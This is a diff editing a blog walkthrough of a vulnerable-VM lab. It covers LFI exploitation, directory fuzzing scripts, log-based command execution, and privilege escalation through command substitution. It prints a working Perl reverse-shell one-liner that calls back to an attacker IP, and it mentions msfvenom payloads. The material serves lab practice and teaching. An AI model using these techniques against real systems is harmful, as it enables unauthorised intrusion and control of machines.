@@ -82,7 +82,7 @@ File found: /research.php - 200
 
 The same two pages were found: `/about.php` and `/research.php`.
 
-Navigating to `/?file=about.php`, I noticed that the content of `/about.php` was loaded twice before the main landing page at `/index.php`.
+Navigating to `/?file=about.php`, I noticed that the content of `/about.php` was included twice before the content of `/index.php`.
 
 OK. Now I'm positive there is a LFI vulnerability with the `file` parameter.
 
@@ -104,7 +104,7 @@ However, I had success displaying the content of `/usr/share/apache2/icons/READM
 
 This would means that absolute path is allowed but some kind of filtering for common LFI attacks is in place. It also means that the [**DocumentRoot**][3]{:target='_blank'} is not your usual `/var/www/html`. :sweat:
 
-Here's what I think the PHP code in `/index.php` could possibly looked like:
+Here's what I imagined the PHP code in `/index.php` looked like:
 
 ```php
 <?php
@@ -118,7 +118,7 @@ Here's what I think the PHP code in `/index.php` could possibly looked like:
 ?>
 ```
 
-To that end, I wrote `fuzz.sh` in combination with the various wordlists from [SecLists][4] to map out the **DocumentRoot**:
+To that end, I wrote `fuzz.sh` in combination with the various wordlists from [SecLists][4] to map out the **DocumentRoot** by exploiting the `file` parameter. For this to work, a unique known string in the file must exists.
 
 ```bash
 # cat fuzz.sh
@@ -139,7 +139,7 @@ for word in $(cat "$WORDLIST"); do
 done
 ```
 
-Now, let's try to map out the **DocumentRoot** by exploiting the `file` parameter. For this to work, a unique known string in the file must exists.
+Now, let's give `fuzz.sh` a shot.
 
 ```
 # ./fuzz.sh "../FUZZ/about.php" "About The Ether" /usr/share/seclists/Discovery/Web_Content/common.txt
@@ -152,7 +152,7 @@ Now, let's try to map out the **DocumentRoot** by exploiting the `file` paramete
 [!] Found: http://192.168.198.130/?file=../public_html/about.php
 ```
 
-Navigating to `/?file=../public_html/about.php` gave me the confidence that `fuzz.sh` is working.
+Navigating to `/?file=../public_html/about.php` gave me the confidence the script is working.
 
 ![fuzz.sh](/assets/images/posts/evilscience-walkthrough/evilscience-4.png)
 
@@ -177,7 +177,7 @@ for word in map(''.join, itertools.product(*zip(s.lower(), s.upper()))):
 #./crunch.py theether.com > custom.txt
 ```
 
-Combined with `fuzz.sh`, I was able to map out the next level.
+Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 
 ```
 # ./brute.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt 
@@ -190,7 +190,7 @@ Combined with `fuzz.sh`, I was able to map out the next level.
 [!] Found: http://192.168.198.130/?file=../../theEther.com/public_html/about.php
 ```
 
-With the rest of the higher levels mapped out fairly easy with the `common.txt` wordlist, the **DocumentRoot** was finally determined to be: `/var/www/html/theEther.com/public_html`
+With the rest of the higher levels mapped out fairly easy with the `common.txt` wordlist from SecLists, the **DocumentRoot** was finally determined to be: `/var/www/html/theEther.com/public_html`
 
 ![docroot](/assets/images/posts/evilscience-walkthrough/evilscience-8.png)
 
@@ -200,7 +200,7 @@ Sweet!
 
 Since I can't access the default `/var/log/apache2/access.log`, there is a possibility that the access log could be defined elsewhere, perhaps even somewhere near.
 
-Using `fuzz.sh`, I was able to map out this location.
+Using `quickhits.txt` from SecLists with `fuzz.sh`, I was able to map out this location.
 
 ```
 # ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
@@ -325,24 +325,22 @@ Also, not quite the PHP code I imagined but close.
 ```
 # ./cmd.sh -e "cat index.php"
 <?php
-$file = $_GET["file"];
+    $file = $_GET["file"];
 
-$file = str_ireplace("etc","", $file);
-$file = str_ireplace("php:","", $file);
-$file = str_ireplace("expect:","", $file);
-$file = str_ireplace("data:","", $file);
-$file = str_ireplace("proc","", $file);
-$file = str_ireplace("home","", $file);
-$file = str_ireplace("opt","", $file);
+    $file = str_ireplace("etc","", $file);
+    $file = str_ireplace("php:","", $file);
+    $file = str_ireplace("expect:","", $file);
+    $file = str_ireplace("data:","", $file);
+    $file = str_ireplace("proc","", $file);
+    $file = str_ireplace("home","", $file);
+    $file = str_ireplace("opt","", $file);
 
 if ($file == "/var/log/auth.log") {
-header("location: index.php");
+    header("location: index.php");
+} else{
+    include($file);
 }
-else{
-include($file);
-}
-
-include($file);
+    include($file);
 ?>
 ```
 
@@ -350,13 +348,11 @@ Awesome. Now that I can execute remote commands, it's reverse shell time. I alwa
 
 `perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 
-To avoid complications it's best to urlencode the above.
-
-`perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.198.128%22%3B%24p%3D80%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27`
+To avoid complications it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.
 
 ![shell](/assets/images/posts/evilscience-walkthrough/evilscience-9.png)
 
-Let's spawn a pseudo-tty for better output control.
+I got shell!
 
 ### Privilege Escalation
 
@@ -376,7 +372,7 @@ In any case, let's run `xxxlogauditorxxx.py` and see what I'm up against.
 
 ![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-13.png)
 
-It appeared to be displaying the content of the log file depending which of the available logs was chosen.
+It appeared to be displaying the content of the chosen log file.
 
 For `/var/log/auth.log`:
 
@@ -398,7 +394,7 @@ My guess is that the command that ran was like so:
 
 `cat /var/log/auth.log /etc/shadow`
 
-With this in mind, I can possibly use command substitution with backticks or `$()` to execute a another command as `root`. But first, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.
+I can possibly use command substitution with backticks or `$()` to execute a another command as `root`. But first, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.
 
 ![msfvenom](/assets/images/posts/evilscience-walkthrough/evilscience-17.png)
 
@@ -426,7 +422,7 @@ Finally, the cat is out of the bag!
 
 `# strings flag.png | sed '$!d' | sed 's/flag: //' | base64 -d`
 
-<pre>
+<pre class="wrap">
 october 1, 2017.
 We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!
 
